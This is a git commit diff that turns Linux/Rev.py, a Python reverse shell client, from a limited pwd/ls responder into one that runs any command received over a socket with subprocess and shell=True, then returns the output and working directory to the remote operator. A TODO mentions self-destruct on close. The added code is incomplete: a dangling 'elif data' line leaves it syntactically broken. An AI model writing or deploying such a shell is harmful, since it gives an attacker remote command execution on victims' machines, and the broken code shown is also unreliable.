ca2d542e9435f33d5eb191d31aed906c1d57225b
cl3tu5 <53231555+CletusG@users.noreply.github.com>
2020-09-06 12:00:08 -0400

    [Unfinished] upgrading
    reversed stuff i did before as well

--- Linux/Rev.py
+++ Linux/Rev.py
@@ -8,18 +8,21 @@ port = int(input("Port: "))
 s.connect((host, port))
 
 while True:
-	command = s.recv(10000)
-	command = command.decode()
-	if command == "pwd":
-		files = os.getcwd()
-		files = str(files)
-		s.send(files.encode())
-	elif command == "ls":
-		cwd = str(os.listdir())
-		s.send(cwd.encode())
-	else:
-		msg = str("[☠] Unkown command")
-		s.send(msg.encode())
+	data = s.recv(2048)
+	# if first 2 characters are cd, change dir to next characters
+	# note the :2 is before and the 3: is after
+	if data[:2].decode("utf-8") == "cd":
+		os.chdir(data[3:].decode("utf-8"))
+	elif data
+
+	# this must not be elif so it gets executed and actually sends the output stuff
+	if len(data) > 0:
+		# process open
+		# play around with shell
+		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		output_bytes = cmd.stdout.read() + cmd.stderr.read()
+		output_str = str(output_bytes, "utf-8")
+		s.send(str.encode(output_str + str(os.getcwd()) + ' $ '))
 
 ## TODO: Self destruct when closed
 
